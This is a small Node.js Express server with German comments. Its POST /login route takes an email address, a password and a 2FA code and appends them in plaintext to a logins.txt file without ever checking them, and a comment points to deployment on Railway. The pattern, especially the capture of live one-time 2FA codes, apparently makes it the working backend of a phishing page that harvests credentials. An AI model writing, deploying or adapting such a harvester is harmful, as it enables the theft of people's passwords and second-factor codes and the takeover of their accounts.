const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Statische Dateien (CSS, JS, Bilder)
app.use(express.static('public'));

// JSON Body lesen
app.use(express.json());

// Startseite
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Login-Daten empfangen
app.post('/login', (req, res) => {
  const { email, password, twofa } = req.body;
  const line = `Email: ${email}, Passwort: ${password}, 2FA: ${twofa}\n`;

  fs.appendFile(path.join(__dirname, 'logins.txt'), line, (err) => {
    if (err) {
      console.error('Fehler beim Speichern:', err);
      return res.status(500).end();
    }
    res.status(200).end();
  });
});

// Railway-Port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('Server läuft auf Port ' + PORT);
});
